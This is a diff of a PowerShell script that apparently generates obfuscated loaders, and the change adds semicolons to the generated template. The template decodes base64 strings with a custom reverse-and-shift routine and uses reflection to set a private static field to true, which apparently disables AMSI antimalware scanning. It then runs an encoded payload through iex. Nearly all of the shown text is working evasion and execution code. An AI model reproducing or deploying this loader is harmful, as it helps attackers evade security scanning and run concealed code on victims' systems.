@@ -14,26 +14,26 @@ function encrypt($v){
 }
 
 $text1="[Byte[]]`$c = [System.Convert]::FromBase64String('"
-$text2="')
-[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=')
-[Byte[]]`$e = [System.Convert]::FromBase64String('W1xjYFg9a2BlQGBqZFg=')
+$text2="');
+[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');
+[Byte[]]`$e = [System.Convert]::FromBase64String('W1xjYFg9a2BlQGBqZFg=');
 function O (`$v){
-    [Byte[]]`$t = `$v.clone()
+    [Byte[]]`$t = `$v.clone();
     for (`$x = 0; `$x -lt `$v.Count; `$x++) {
-        `$t[`$v.Count-`$x-1] = `$v[`$x] + 3
+        `$t[`$v.Count-`$x-1] = `$v[`$x] + 3;
     }
-    return `$t
+    return `$t;
 }
 
-`$y = 9
+`$y = 9;
 while(`$y -gt 6){
-    `$c = O(`$c)
-    `$d = O(`$d)
-    `$e = O(`$e)
-    `$y = `$y - 1
+    `$c = O(`$c);
+    `$d = O(`$d);
+    `$e = O(`$e);
+    `$y = `$y - 1;
 }
-[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$d)).GetField([System.Text.Encoding]::ASCII.GetString(`$e),'NonPublic,Static').SetValue(`$null,`$true)
-iex([System.Text.Encoding]::ASCII.GetString(`$c))"
+[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$d)).GetField([System.Text.Encoding]::ASCII.GetString(`$e),'NonPublic,Static').SetValue(`$null,`$true);
+iex([System.Text.Encoding]::ASCII.GetString(`$c));"
 
 If(![String]::IsNullOrEmpty($c) -and [String]::IsNullOrEmpty($f)){
     $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($c))
